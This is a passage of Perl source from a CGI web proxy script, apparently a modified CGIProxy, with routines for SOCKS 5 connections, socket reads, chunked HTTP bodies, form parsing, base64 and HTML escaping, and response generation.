    foreach ( split(/\s*;\s*/, $ENV{HTTP_COOKIE}) ) {
	($name, $value)= split(/=/, $_) ;
	$session_id= $value, next  if $name eq 'S' ;
	$session_id_persistent= $value, next  if $name eq 'S2' ;
    }
}


sub newsocketto {
    my($S, $host, $port)= @_ ;
    my($is_connected) ;

    if ($SOCKS_PROXY) {
	($host, $port)= $SOCKS_PROXY=~ /\[/
	    ? $SOCKS_PROXY=~ /^\[([^\]]*)\]:?(.*)/
	    : split(/:/, $SOCKS_PROXY) ;
	$port||= 1080 ;
    }

    # If $host is long integer like 3467251275, break it into a.b.c.d format.
    # This is for big-endian; reverse the list for little-endian.
    $host= join('.', $host>>24 & 255, $host>>16 & 255, $host>>8 & 255,
		     $host & 255)
	if $host=~ /^\d+$/ ;

    # IPv6 support requires Socket version 1.94 or later.
    if ($Socket::VERSION>=1.94) {
	# Create the remote host data structure, from host name or IP address.
	my($err, @addr)= $host=~ /^[\d.:]+$/
	    ? getaddrinfo($host, $port, { flags => AI_NUMERICHOST(), socktype => SOCK_STREAM })
	    : getaddrinfo($host, $port, { socktype => SOCK_STREAM }) ;
	&HTMLdie(["Couldn't find address for %s: %s", $host, $!]) if $err==EAI_NONAME() ;
	&HTMLdie(["Error looking up address for %s: %s", $host, $!]) if $err ;

	no strict 'refs' ;   # needed to use $S as filehandle

	foreach my $addr (@addr) {
	    # If the target IP address is a banned host or network, die appropriately.
	    # This assumes that IP address structs have the most significant byte first.
	    # This is a quick addition that will be fleshed out in a later version.
	    # This may not work with IPv6, depending on what inet_aton() returns then.
	    if ($addr->{family}==AF_INET) {
		for (@BANNED_NETWORK_ADDRS) {
		    &banned_server_die() if $addr->{addr}=~ /^$_/ ;   # No URL forces a die
		}
	    } else {
		warn "\@BANNED_NETWORK_ADDRS not supported for IPv6 yet.\n" ;
	    }

	    # Create the socket and connect to the remote host

	    socket($S, $addr->{family}, SOCK_STREAM, (getprotobyname('tcp'))[2])
		or next ;
	    if (connect($S, $addr->{addr})) {
		$is_connected= 1 ;
		last ;
	    }
	}
	&HTMLdie(["Couldn't connect to %s:%s: %s", $host, $port, $!])
	    unless $is_connected ;

    # IPv4 only.
    } else {
	&HTMLdie("Can't access IPv6 addresses.  To support IPv6, install version 1.94 or later of the CPAN Socket module, perhaps by running \"cpan Socket\" from the server command line.")
	    if $host=~ /:/ ;
	# Create the remote host data structure, from host name or IP address.
	# Note that inet_aton() handles both alpha names and IP addresses.
	my $hostaddr= inet_aton($host)
	    or &HTMLdie(["Couldn't find address for %s: %s", $host, $!]) ;
	my $remotehost= pack_sockaddr_in($port, $hostaddr) ;

	for (@BANNED_NETWORK_ADDRS) {
	    &banned_server_die() if $hostaddr=~ /^$_/ ;   # No URL forces a die
	}

	# Create the socket and connect to the remote host
	no strict 'refs' ;   # needed to use $S as filehandle
	socket($S, AF_INET, SOCK_STREAM, (getprotobyname('tcp'))[2])
	    or &HTMLdie(["Couldn't create socket: %s", $!]) ;
	connect($S, $remotehost)
	    or &HTMLdie(["Couldn't connect to %s:%s: %s", $host, $port, $!]) ;
    }    

    select((select($S), $|=1)[0]) ;      # unbuffer the socket

    # Use original $host and $port by passing @_ .
    init_socks_connection(@_)  if $SOCKS_PROXY ;
}


# Initiate a SOCKS 5 connection on $S-- see RFC 1928.
# This will need to be updated to support IPv6.
sub init_socks_connection {
    my($S, $host, $port)= @_ ;

    &HTMLdie("Hostname too long for SOCKS request: [$host]") if length($host)>255 ;
    &HTMLdie("\$SOCKS_USERNAME and \$SOCKS_PASSWORD may only be up to 255 characters each.")
	if length($SOCKS_USERNAME)>255 or length($SOCKS_PASSWORD)>255 ;

    # We can use either of two authentication methods: username/password or none.
    #   Neither is secure on the link between CGIProxy and the SOCKS proxy!
    my $auth_selection= ($SOCKS_USERNAME ne '')  ? "\x05\x02\x00\x02"  : "\x05\x01\x00" ;

    no strict 'refs' ;   # needed to use $S as filehandle
    print $S $auth_selection ;
    my $auth_method= substr(read_socket($S, 2), 1) ;

    if ($auth_method eq "\x00") {
	# No subnegotiation needed
    } elsif ($auth_method eq "\x02") {
	# Username/Password Authentication-- see RFC 1929.
	printf $S "\x01%s%s%s%s", chr(length($SOCKS_USERNAME)), $SOCKS_USERNAME,
				  chr(length($SOCKS_PASSWORD)), $SOCKS_PASSWORD ;
	&HTMLdie("Failed authentication to SOCKS server.")
	    if substr(read_socket($S, 2), 1) ne "\x00" ;
    } elsif ($auth_method eq "\xff") {
	&HTMLdie("Couldn't negotiate authentication method with SOCKS server-- perhaps set \$SOCKS_USERNAME and \$SOCKS_PASSWORD?") ;
    } else {
	&HTMLdie("Bad authorization method chosen by SOCKS proxy.") ;
    }

    # Make SOCKS request-- currently we only use CONNECT command.
    # We use the address type of DOMAINNAME to prevent local DNS lookup, which
    #   could expose the user.
    printf $S "\x05\x01\x00\x03%s%s%s", chr(length($host)), $host, pack('n', $port) ;

    # Read first part of reply.
    my(undef, $rep, undef, $atyp)= split(//, read_socket($S, 4)) ;

    # Depending on the address type, read BND.ADDR and BND.PORT .
    if ($atyp eq "\x01") {
	read_socket($S, 6) ;
    } elsif ($atyp eq "\x03") {
	my $len= ord(read_socket($S, 1)) ;
	read_socket($S, $len+2) ;
    } elsif ($atyp eq "\x04") {
	read_socket($S, 18) ;
    } else {
	&HTMLdie("Bad ATYP in response from SOCKS proxy.") ;
    }

    if ($rep ne "\x00") {
	# Quick and dirty error handling; error strings are from RFC.
	my $errmsg= (undef,
		     'general SOCKS server failure',
		     'connection not allowed by ruleset',
		     'Network unreachable',
		     'Host unreachable',
		     'Connection refused',
		     'TTL expired',
		     'Command not supported',
		     'Address type not supported')[ord($rep)] ;
	&HTMLdie(['SOCKS request to proxy failed: %s', $errmsg]) ;
    }
}


sub read_socket {
#    local(*S, $length)= @_ ;
    my($S, $length)= @_ ;
    my($ret, $numread, $thisread) ;

    #$numread= 0 ;
    no strict 'refs' ;   # needed to use $S as filehandle

    while (    ($numread<$length)
#	    && ($thisread= read(S, $ret, $length-$numread, $numread) ) )
	    && ($thisread= read($S, $ret, $length-$numread, $numread) ) )
    {
	$numread+= $thisread ;
    }
    return undef unless defined($thisread) ;

    return $ret ;
}


# Read a chunked body and footers from a socket; assumes that the
#   Transfer-Encoding: is indeed chunked.
# Returns the body and footers (which should then be appended to any
#   previous headers), or undef on error.
# For details of chunked encoding, see the HTTP 1.1 spec, e.g. RFC 2616
#   section 3.6.1 .
sub get_chunked_body {
    my($S)= @_ ;
    my($body, $footers, $chunk_size, $chunk) ;
    local($_) ;
    local($/)= "\012" ;

    # Read one chunk at a time and append to $body.
    # Note that hex() will automatically ignore a semicolon and beyond.
    no strict 'refs' ;     # needed to use $S as filehandle
    $body= '' ;            # to distinguish it from undef
    no warnings 'digit' ;  # to let hex() operate without warnings
    while ($chunk_size= hex(<$S>) ) {
	$body.= $chunk= &read_socket($S, $chunk_size) ;
	return undef unless length($chunk) == $chunk_size ;  # implies defined()
	$_= <$S> ;         # clear CRLF after chunk
    }

    # After all chunks, read any footers, NOT including the final blank line.
    while (<$S>) {
	last if /^(\015\012|\012)/  || $_ eq '' ;   # lines end w/ LF or CRLF
	$footers.= $_ ;
    }
    $footers=~ s/(\015\012|\012)[ \t]+/ /g ;       # unwrap long footer lines

    return wantarray  ? ($body, $footers)  : $body  ;
}



# This is a minimal routine that reads URL-encoded variables from a string,
#   presumably from something like QUERY_STRING.  If no string is passed,
#   it will read from either QUERY_STRING or STDIN, depending on
#   REQUEST_METHOD.  STDIN can't be read more than once for POST requests.
# It returns a hash.  In the event of multiple variables with the same name,
#   it concatenates the values into one hash element, delimiting with "\0".
# Returns undef on error.
sub getformvars {
    my($in)= @_ ;
    my(%in, $name, $value) ;

    # If no string is passed, read it from the usual channels.
    unless (defined($in)) {
	if ( ($ENV{'REQUEST_METHOD'} eq 'GET') ||
	     ($ENV{'REQUEST_METHOD'} eq 'HEAD') ) {
	    $in= $ENV{'QUERY_STRING'} ;
	} elsif ($ENV{'REQUEST_METHOD'} eq 'POST') {
	    return undef unless
		lc($ENV{'CONTENT_TYPE'}) eq 'application/x-www-form-urlencoded';
	    return undef unless defined($ENV{'CONTENT_LENGTH'}) ;
	    $in= &read_socket($STDIN, $ENV{'CONTENT_LENGTH'}) ;
	    # should we return undef if not all bytes were read?
	} else {
	    return undef ;   # unsupported REQUEST_METHOD
	}
    }

    foreach (split(/[&;]/, $in)) {
	s/\+/ /g ;
	($name, $value)= split('=', $_, 2) ;
	$name=~ s/%([\da-fA-F]{2})/ pack('C', hex($1)) /ge ;
	$value=~ s/%([\da-fA-F]{2})/ pack('C', hex($1)) /ge ;
	$in{$name}.= "\0" if defined($in{$name}) ;  # concatenate multiple vars
	$in{$name}.= $value ;
    }
    return %in ;
}


sub rfc1123_date {
    my($time, $use_dash)= @_ ;
    my($s) =  $use_dash  ? '-'  : ' ' ;
    my(@t)= gmtime($time) ;

    return sprintf("%s, %02d$s%s$s%04d %02d:%02d:%02d GMT",
		   $WEEKDAY[$t[6]], $t[3], $MONTH[$t[4]], $t[5]+1900, $t[2], $t[1], $t[0] ) ;
}


# Returns true if $date1 is later than $date2.  Both parameters can be in
#   either rfc1123_date() format or the total-seconds format from time().
#   rfc1123_date() format is "Wdy, DD-Mon-YYYY HH:MM:SS GMT", possibly using
#   spaces instead of dashes.
# Returns undef if either date is invalid.
# A more general function would be un_rfc1123_date(), to take an RFC 1123 date
#   and return total seconds.
sub date_is_after {
    my($date1, $date2)= @_ ;
    my(@d1, @d2) ;

    # Trivial case when both are numeric.
    return ($date1>$date2)  if $date1=~ /^\d+$/ && $date2=~ /^\d+$/ ;

    # Get date components, depending on formats
    if ($date1=~ /^\d+$/) {
	@d1= (gmtime($date1))[3,4,5,2,1,0] ;
    } else {
	@d1= $date1=~ /^\w+,\s*(\d+)[ -](\w+)[ -](\d+)\s+(\d+):(\d+):(\d+)/ ;
	return undef unless @d1 ;
	$d1[1]= $UN_MONTH{lc($d1[1])} ;
	$d1[2]-= 1900 ;
    }
    if ($date2=~ /^\d+$/) {
	@d2= (gmtime($date2))[3,4,5,2,1,0] ;
    } else {
	@d2= $date2=~ /^\w+,\s*(\d+)[ -](\w+)[ -](\d+)\s+(\d+):(\d+):(\d+)/ ;
	return undef unless @d2 ;
	$d2[1]= $UN_MONTH{lc($d2[1])} ;
	$d2[2]-= 1900 ;
    }

    # Compare year, month, day, hour, minute, second in order.
    return ( ( $d1[2]<=>$d2[2] or $d1[1]<=>$d2[1] or $d1[0]<=>$d2[0] or
	       $d1[3]<=>$d2[3] or $d1[4]<=>$d2[4] or $d1[5]<=>$d2[5] )
	     > 0 ) ;
}


sub HTMLescape {
    my($s)= @_ ;
    $s=~ s/&/&amp;/g ;      # must be before all others
    $s=~ s/([^\x00-\x7f])/'&#' . ord($1) . ';'/ge ;
    $s=~ s/"/&quot;/g ;
    $s=~ s/</&lt;/g ;
    $s=~ s/>/&gt;/g ;
    return $s ;
}
sub HTMLunescape {
    my($s)= @_ ;
    $s=~ s/&quot\b;?/"/g ;
    $s=~ s/&lt\b;?/</g ;
    $s=~ s/&gt\b;?/>/g ;
    $s=~ s/&#(x)?(\w+);?/ $1 ? chr(hex($2)) : chr($2) /ge ;
    $s=~ s/&amp\b;?/&/g ;      # must be after all others
    return $s ;
}



# Base64-encode a string, except not inserting line breaks.
sub base64 {
    my($s)= @_ ;
    my($ret, $p, @c, $t) ;

    # Base64 padding is done with "=", but that's in the first 64 characters.
    #   So, use "@" as a placeholder for it until the tr/// statement.

    # For each 3 bytes, build a 24-bit integer and split it into 6-bit chunks.
    # Insert one or two padding chars if final substring is less than 3 bytes.
    while ($p<length($s)) {
	@c= unpack('C3', substr($s,$p,3)) ;
	$p+= 3 ;
	$t= ($c[0]<<16) + ($c[1]<<8) + $c[2] ;     # total 24-bit integer
	$ret.= pack('C4',     $t>>18,
			     ($t>>12)%64,
		    (@c>1) ? ($t>>6) %64 : 64,
		    (@c>2) ?  $t     %64 : 64 ) ;  # "@" is chr(64)
    }

    # Translate from bottom 64 chars into base64 chars, plus @ to = conversion.
    $ret=~ tr#\x00-\x3f@#A-Za-z0-9+/=# ;

    return $ret ;
}


# Opposite of base64() .
sub unbase64 {
    my($s)= @_ ;
    my($ret, $p, @c, $t, $pad) ;

    $pad++ if $s=~ /=$/ ;
    $pad++ if $s=~ /==$/ ;

    $s=~ tr#A-Za-z0-9+/##cd ;          # remove non-allowed characters
    $s=~ tr#A-Za-z0-9+/#\x00-\x3f# ;   # for speed, translate to \x00-\x3f

    # For each 4 chars, build a 24-bit integer and split it into 8-bit bytes.
    # Remove one or two chars from result if input had padding chars.
    while ($p<length($s)) {
	@c= unpack('C4', substr($s,$p,4)) ;
	$p+= 4 ;
	$t= ($c[0]<<18) + ($c[1]<<12) + ($c[2]<<6) + $c[3] ;
	$ret.= pack('C3', $t>>16, ($t>>8) % 256, $t % 256 ) ;
    }
    chop($ret) if $pad>=1 ;
    chop($ret) if $pad>=2 ;

    return $ret ;
}



# Convert a string from UTF-16 encoding to UTF-8.
sub un_utf16 {
    my($s)= @_ ;

    Encode::from_to($$s, "utf-16", "utf-8") ;  # converts in-place
}



# Read an entire file into a string and return it; return undef on error.
# Does NOT check for any security holes in $fname!
# This assumes UTF-8 file contents.
sub readfile {
    my($fname)= @_ ;
    my($ret) ;
    local(*F, $/) ;

    open(F, '<:encoding(UTF-8)', $fname) || return undef ;
    undef $/ ;
    $ret= <F> ;
    close(F) ;

    return $ret ;
}



sub random_string {
    my($len)= @_ ;
    my @chars= (0..9, 'a'..'z', 'A'..'Z') ;
    return join('', map { $chars[rand(scalar @chars)] } 1..$len) ;
}


# Takes a list reference and shuffles list in place.
sub shuffle {
    my($a)= @_ ;
    my $i= @$a ;   # length
    my $j ;
    $j= rand($i--), @$a[$i,$j]= @$a[$j,$i]  while $i>0 ;
}

sub http_get2 {
    my($c, $request_uri)= @_ ;
    my($s, $status, $status_code, $headers, $body, $footers, $rin, $win, $num_tries) ;
    local($/)= "\012" ;

    no strict 'refs' ;    # needed for symbolic references

    # Using "$c->{socket}" causes syntax errors in some places, so alias it to $s.
    $s= $c->{socket} ;

    # For some reason, under mod_perl, occasionally the socket response is
    #   empty.  It may have something to do with the scope of the filehandles.
    #   Work around it with this hack-- if such occurs, retry the routine up
    #   to three times.
    RESTART: {
	# Create a new socket if a persistent one isn't lingering from last time.
	# Ideally we'd test eof() on the socket at the end of this routine, but
	#   that may only fail after many seconds.  So, here we assume the socket
	#   is still usable if it's not '' and if we can write to it.
	vec($win= '', fileno($s), 1)= 1 if defined(fileno($s)) ;
	if (!$c->{open} || !select(undef, $win, undef, 0)) {
	    &newsocketto($c->{socket}, $c->{host}, $c->{port}) ;
	    $c->{open}= 1 ;
	}

	# Print the simple request.
	print $s 'GET ', $request_uri, " HTTP/1.1\015\012",
		 'Host: ', $c->{host}, (($c->{port}==80)  ? ''  : ":$c->{port}"), "\015\012",
		 "\015\012" ;


	vec($rin= '', fileno($s), 1)= 1 ;
	select($rin, undef, undef, 60)
	    || &HTMLdie(['No response from %s:%s', $c->{host}, $c->{port}]) ;

	$status= <$s> ;

	# hack hack....
	unless ($status=~ m#^HTTP/#) {
	    $c->{open}= 0 ;
	    redo RESTART if ++$num_tries<3 ;
	    &HTMLdie(['Invalid response from %s: [%s]', $c->{host}, $status]) ;
	}
    }


    # Loop to get $status and $headers until we get a non-100 response.
    # See comments in http_get(), above the similar block.
    do {
	($status_code)= $status=~ m#^HTTP/\d+\.\d+\s+(\d+)# ;

	$headers= '' ;
	do {
	    $headers.= $_= <$s> ;    # $headers includes last blank line
	} until (/^(\015\012|\012)$/) || $_ eq '' ; #lines end w/ LF or CRLF

	$status= <$s> if $status_code == 100 ;  # re-read for next iteration
    } until $status_code != 100 ;

    # Unfold long header lines, a la RFC 822 section 3.1.1
    $headers=~ s/(\015\012|\012)[ \t]+/ /g ;

    # Read socket body depending on how length is determined; see RFC 2616 (the
    #   HTTP 1.1 spec), section 4.4.
    if ($headers=~ /^Transfer-Encoding:[ \t]*chunked\b/mi) {
	($body, $footers)= &get_chunked_body($s) ;
	&HTMLdie(['Error reading chunked response from %s .', &HTMLescape($c->{host})])
	    unless defined($body) ;
	$headers=~ s/^Transfer-Encoding:[^\012]*\012?//mig ;
	$headers=~ s/^(\015\012|\012)/$footers$1/m ;

    } elsif ($headers=~ /^Content-Length:[ \t]*(\d+)/mi) {
	$body= &read_socket($s, $1) ;

    } else {
	undef $/ ;
	$body= <$s> ;  # ergo won't be persistent connection
	close($s) ;
	$c->{open}= 0 ;
    }

    # If server doesn't support persistent connections, then close the socket.
    # We would test eof($s) here, but that causes a long wait.
    if ($headers=~ /^Connection:.*\bclose\b/mi || $status=~ m#^HTTP/1\.0#) {
	close($s) ;
	$c->{open}= 0 ;
    }

    return $body ;
}


sub full_insertion {
    my($URL, $in_top_frame)= @_ ;
    my($ret, $form, $insertion) ;
    $form= &mini_start_form($URL, $in_top_frame) if $e_insert_entry_form ;

    if (($INSERT_HTML ne '') || ($INSERT_FILE ne '')) {
	&set_custom_insertion if $CUSTOM_INSERTION eq '' ;

	# The insertion should not have relative URLs, but in case it does
	#   provide a base URL of this script for lack of anything better.
	#   It's erroneous, but it avoids unpredictable behavior.  $url_start
	#   is also required for proxify_html(), but it has already been set.
	# We can't do this only once to initialize, we must do this for each
	#   run, because user config flags might change from run to run.
	# NOTE!  If we don't use 0 in &proxify_html() here we'll recurse!
	if ($ANONYMIZE_INSERTION) {
	    local($base_url)= $script_url ;
	    &fix_base_vars ;
	    $insertion= &proxify_html(\$CUSTOM_INSERTION,0) ;
	} else {
	    $insertion= $CUSTOM_INSERTION ;
	}
    }

    $ret= $FORM_AFTER_INSERTION  ? $insertion . $form  : $form . $insertion ;

    my(%inc_by)= %in_mini_start_form ;
    foreach (keys %IN_CUSTOM_INSERTION) {
	$inc_by{$_}+= $IN_CUSTOM_INSERTION{$_} ;
    }
    $ret.= "<script type=\"text/javascript\">\n"
	 . "if (typeof(_proxy_jslib_increments)=='object') {\n"
	 . join('', map { "    _proxy_jslib_increments['$_']= $inc_by{$_} ;\n" }
			keys %inc_by)
	 . "}\n</script>\n"
	if %inc_by ;

    $ret= "\n<div id=\"_proxy_css_top_insertion\">\n$ret</div>\n\n<div id=\"_proxy_css_main_div\" style=\"position:relative\">\n" ;

    return $ret ;
}


# Returns the HTML needed for JavaScript support, the insertion into the <head>
#   of the document.
sub js_insertion {
    my($base_url_jsq, $default_script_type_jsq, $default_style_type_jsq,
       $p_cookies_are_banned_here, $p_doing_insert_here, $p_session_cookies_only,
       $p_cookie_path_follows_spec, $p_respect_three_dot_rule,
       $p_allow_unproxified_scripts, $p_use_db_for_cookies, $p_proxify_comments,
       $p_alert_on_csp_violation, $cookies_from_db_jsq, $p_csp, $p_timeout_multiplier) ;
    # Create JS double-quoted string of base URL and other vars.
    ($base_url_jsq=            $base_url           )=~ s/(["\\])/\\$1/g ;
    ($default_script_type_jsq= $default_script_type)=~ s/(["\\])/\\$1/g ;
    ($default_style_type_jsq=  $default_style_type )=~ s/(["\\])/\\$1/g ;
    ($cookies_from_db_jsq= $USE_DB_FOR_COOKIES
	?  get_cookies_from_db($path, $host, $port, $scheme, 1)  : '')=~ s/(["\\])/\\$1/g ;
    $p_cookies_are_banned_here=   $cookies_are_banned_here   ? 'true'  : 'false' ;
    $p_doing_insert_here=         $doing_insert_here         ? 'true'  : 'false' ;
    $p_session_cookies_only=      $SESSION_COOKIES_ONLY      ? 'true'  : 'false' ;
    $p_cookie_path_follows_spec=  $COOKIE_PATH_FOLLOWS_SPEC  ? 'true'  : 'false' ;
    $p_respect_three_dot_rule=    $RESPECT_THREE_DOT_RULE    ? 'true'  : 'false' ;
    $p_allow_unproxified_scripts= $ALLOW_UNPROXIFIED_SCRIPTS ? 'true'  : 'false' ;
    $p_use_db_for_cookies=        $USE_DB_FOR_COOKIES        ? 'true'  : 'false' ;
    $p_proxify_comments=          $PROXIFY_COMMENTS          ? 'true'  : 'false' ;
    $p_alert_on_csp_violation=    $ALERT_ON_CSP_VIOLATION    ? 'true'  : 'false' ;

    $p_timeout_multiplier= $TIMEOUT_MULTIPLIER_BY_HOST{$host} || 1 ;

    eval { require JSON } ;   # below is only place JSON is used
    $p_csp= $csp  ? JSON::encode_json($csp)  : '{}' ;
    $p_csp=~ s/(["\\])/\\$1/g ;

    my $hostst= $host=~ /:/  ? "[$host]"  : $host ;
    # Use class instead of id, in case we're chaining proxies.
    return '<script class="_proxy_jslib_jslib" type="text/javascript" src="'
	 . &HTMLescape($url_start . &wrap_proxy_encode('x-proxy://scripts/jslib'))
	 . "\"></script>\n"
	 . qq(<script class="_proxy_jslib_pv" type="text/javascript">_proxy_jslib_pass_vars("$base_url_jsq","$scheme://$host:$port", $p_cookies_are_banned_here,$p_doing_insert_here,$p_session_cookies_only,$p_cookie_path_follows_spec,$p_respect_three_dot_rule,$p_allow_unproxified_scripts,"$RTMP_SERVER_PORT","$default_script_type_jsq","$default_style_type_jsq",$p_use_db_for_cookies,$p_proxify_comments,$p_alert_on_csp_violation,"$cookies_from_db_jsq", $p_timeout_multiplier, "$p_csp");</script>\n) ;
}


sub set_custom_insertion {
    return if $CUSTOM_INSERTION ne '' ;
    return unless ($INSERT_HTML ne '') || ($INSERT_FILE ne '') ;

    # Read $CUSTOM_INSERTION from the appropriate source.
    $CUSTOM_INSERTION= ($INSERT_HTML ne '')   ? $INSERT_HTML  : &readfile($INSERT_FILE) ;

    # Now, set counts in %IN_CUSTOM_INSERTION.
    %IN_CUSTOM_INSERTION= () ;
    foreach (qw(applet embed form id layer)) {
	$IN_CUSTOM_INSERTION{$_.'s'}++ while $CUSTOM_INSERTION=~ /<\s*$_\b/gi ;
    }
    $IN_CUSTOM_INSERTION{anchors}++ while $CUSTOM_INSERTION=~ /<\s*a\b[^>]*\bname\s*=/gi ;
    $IN_CUSTOM_INSERTION{links}++   while $CUSTOM_INSERTION=~ /<\s*a\b[^>]*\bhref\s*=/gi ;
    $IN_CUSTOM_INSERTION{images}++  while $CUSTOM_INSERTION=~ /<\s*img\b/gi ;
}

# Print the footer common to most error responses
sub footer {
    # Assume translations already loaded.
    my $restart=  $lang eq 'eddiekidiw' || $lang eq ''  ? 'Restart'   : $MSG{$lang}{Restart} ;
    my $download= $lang eq 'eddiekidiw' || $lang eq ''  ? 'download'  : $MSG{$lang}{download} ;
    my $safety=   $lang eq 'eddiekidiw' || $lang eq ''  ? 'safety'    : $MSG{$lang}{safety} ;

    # Set $left and $right alignment, depending on $dir .
    my($left, $right)= $dir  ? ('right', 'left')  : ('left', 'right') ;

    # Detect whether this proxy can visit secure servers.
    if (!defined $SSL_SUPPORTED) {
	eval { require Net::SSLeay } ;
	$SSL_SUPPORTED=  $@  ? 0  : 1 ;
    }
    my $link_scheme= $SSL_SUPPORTED  ? 'https'  : 'http' ;

    my($rightlink)= $NO_LINK_TO_START
	? ''
	: qq(<a href="$script_url/$lang"><i>$restart</i></a>) ;

    my $proxified_homepage= &HTMLescape(full_url("$link_scheme://www.jmarshall.com/tools/cgiproxy/")) ;
    my $download_link= &HTMLescape(full_url("$link_scheme://www.jmarshall.com/tools/cgiproxy/releases/cgiproxy.latest.tar.gz")) ;
    my $safety_link= &HTMLescape(full_url("$link_scheme://www.jmarshall.com/tools/cgiproxy/security.html")) ;

    return <<EOF ;

EOF
}



# Return the contents of the top frame, i.e. the one with whatever insertion
#   we have-- the entry form and/or the inserted HTML or file.
sub return_top_frame {
    my($enc_URL)= @_ ;
    my($body, $insertion) ;
    my($date_header)= &rfc1123_date($now, 0) ;

    # Redirect any links to the top frame.  Make sure any called routines know
    #   this by setting $base_unframes.  Also use $url_start_noframe to make
    #   sure any links with a "target" attribute that are followed from an
    #   anonymized insertion have the frame flag unset, and therefore have
    #   their own correct insertion.
    local($base_unframes)= 1 ;
    local($url_start)= $url_start_noframe ;

    $body= &full_insertion(&wrap_proxy_decode($enc_URL), 1) ;

    my $response= <<EOR . footer() ;
<html$dir>
<head><base target="_top"></head>
<body>
$body
</body>
</html>
EOR
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


# Return a frame document that puts the insertion in the top frame and the
#   actual page in the lower frame.  Both of these will have the is_in_frame
#   flag set.
# This does not set the text direction, since the two frames may have different
#   directions.
# MUST be careful to set $is_in_frame flag!  Else will recurse!
# NOTE: IF YOU MODIFY THIS ROUTINE, then be sure to review and possibly
#   modify the corresponding routine _proxy_jslib_return_frame_doc() in the
#   JavaScript library, far below in the routine return_jslib().  It is
#   mostly a Perl-to-JavaScript translation of this routine.
sub return_frame_doc {
    my($enc_URL, $title)= @_ ;
    my($qs_URL, $top_URL, $page_URL) ;
    my($date_header)= &rfc1123_date($now, 0) ;

    ($qs_URL= $enc_URL) =~ s/([^\w.-])/ '%' . sprintf('%02x',ord($1)) /ge ;
    $top_URL= &HTMLescape($url_start_inframe
			. &wrap_proxy_encode('x-proxy://frames/topframe?URL=' . $qs_URL) ) ;
    $page_URL= &HTMLescape($url_start_inframe . $enc_URL) ;


    my $response= <<EOR . footer() ;
EOR

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html
Content-Length: $cl

EOH
    die "exiting" ;
}

# When an image should be blanked, returns either a transparent 1x1 GIF or
#   a 406 result ("Not Acceptable").
sub skip_image {
    &return_empty_gif if $RETURN_EMPTY_GIF ;

    my($date_header)= &rfc1123_date($now, 0) ;
    print $STDOUT "$HTTP_1_X 406 Not Acceptable\015\012$session_cookies${NO_CACHE_HEADERS}Date: $date_header\015\012\015\012" ;
    die "exiting" ;
}


# Return a 1x1 transparent GIF.  Yes, that's an inlined 43-byte GIF.
sub return_empty_gif {
    my($date_header)= &rfc1123_date($now, 0) ;

    print $STDOUT <<EOF ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: image/gif
Content-Length: 43

GIF89a\x01\0\x01\0\x80\0\0\0\0\0\xff\xff\xff\x21\xf9\x04\x01\0\0\0\0\x2c\0\0\0\0\x01\0\x01\0\x40\x02\x02\x44\x01\0\x3b
EOF

    die "exiting" ;
}

# Returns a 302 redirection response to $location, with optional extra headers.
# $other_headers must be complete with final "\015\12", etc.
sub redirect_to {
    my($location, $other_headers)= @_ ;
    print $STDOUT "$HTTP_1_X 302 Moved\015\012", $session_cookies, $NO_CACHE_HEADERS,
		  "Date: ", &rfc1123_date($now,0), "\015\012",
		  $other_headers,
		  "Location: $location\015\012\015\012" ;

    die "exiting" ;
}

# Present the initial entry form
sub show_start_form {
    my($msg, $URL)= @_ ;
    my($method, $action, $flags, $cookies_url, $safe_URL, $jslib_block,
       $onsubmit, $onload) ;
    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;

    my $begin_browsing= $lang eq 'eddiekidiw' || $lang eq ''
	? ' '  : $MSG{$lang}{'Buka'} ;

    $msg= $MSG{$lang}{$msg} || $msg  if $lang ne 'eddiekidiw' and $lang ne '' ;

    $msg= "\n<h1><font color=green>$msg</font></h1>"  if $msg ne '' ;

    $method= $USE_POST_ON_START   ? 'post'   : 'get' ;

    $action=      &HTMLescape( $url_start . &wrap_proxy_encode('x-proxy://start') ) ;
    $cookies_url= &HTMLescape( $url_start . &wrap_proxy_encode('x-proxy://cookies/manage') ) ;
    $safe_URL= &HTMLescape($URL) ;

    # Encode the URL before submitting, if so configured.  Start it with "\x01" or
    #   "\x7f" (depending on the browser) to indicate that it's encoded.
    if ($ENCODE_URL_INPUT) {
	$jslib_block= '<script type="text/javascript" src="'
		    . &HTMLescape($url_start . &wrap_proxy_encode('x-proxy://scripts/jslib'))
		    . "\"></script>\n" ;
	my $encode_prefix= $ENV{HTTP_USER_AGENT}=~ /Chrome|Safari/  ? "\\x7f"  : "\\x01" ;
	$onsubmit= qq( onsubmit="if (!this.URL.value.match(/^$encode_prefix/)) this.URL.value= '$encode_prefix'+_proxy_jslib_wrap_proxy_encode(this.URL.value) ; return true") ;
	$onload= qq( onload="document.URLform.URL.focus() ; if (document.URLform.URL.value.match(/^$encode_prefix/)) document.URLform.URL.value= _proxy_jslib_wrap_proxy_decode(document.URLform.URL.value.replace(/$encode_prefix/, ''))") ;
    } else {
	$jslib_block= $onsubmit= '' ;
	$onload= ' onload="document.URLform.URL.focus()"' ;
    }

    # Include checkboxes if user config is allowed.
    if ($ALLOW_USER_CONFIG) {
	my($rc_on)= $e_remove_cookies     ? ' checked'  : '' ;
	my($rs_on)= $e_remove_scripts     ? ' checked'  : '' ;
	my($fa_on)= $e_filter_ads         ? ' checked'  : '' ;
	my($br_on)= $e_hide_referer       ? ' checked'  : '' ;
	my($if_on)= $e_insert_entry_form  ? ' checked'  : '' ;
	$flags= $lang eq 'eddiekidiw' || $lang eq ''  ? <<EOF  : $MSG{$lang}{'show_start_form.flags'} ;
EOF
	$flags= sprintf($flags, $rc_on, $rs_on, $fa_on, $br_on, $if_on) ;
    }

    # "flags" means either flag icons, or boolean software flags.... :P

    # Set the HTML table with the flag icons.  Messy.
    my $flags_HTML= flags_HTML() ;
    my $safe_THIS_SCRIPT_URL= &HTMLescape($THIS_SCRIPT_URL) ;
    $flags_HTML= join('&nbsp;&nbsp;&nbsp;&nbsp; ', map { sprintf($flags_HTML->{$_}, $safe_THIS_SCRIPT_URL) }
			      sort keys %$flags_HTML) ;

